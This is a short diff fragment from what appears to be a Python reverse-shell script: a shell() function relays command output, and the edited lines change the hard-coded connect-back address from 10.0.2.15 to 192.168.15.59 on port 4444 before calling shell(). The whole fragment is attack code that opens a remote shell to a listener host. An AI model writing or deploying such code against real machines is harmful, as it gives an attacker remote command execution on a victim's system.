@@ -72,5 +72,5 @@ def shell():
             data_send(rcomm)
         
 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-soc.connect(('10.0.2.15', 4444))
+soc.connect(('192.168.15.59', 4444))
 shell()
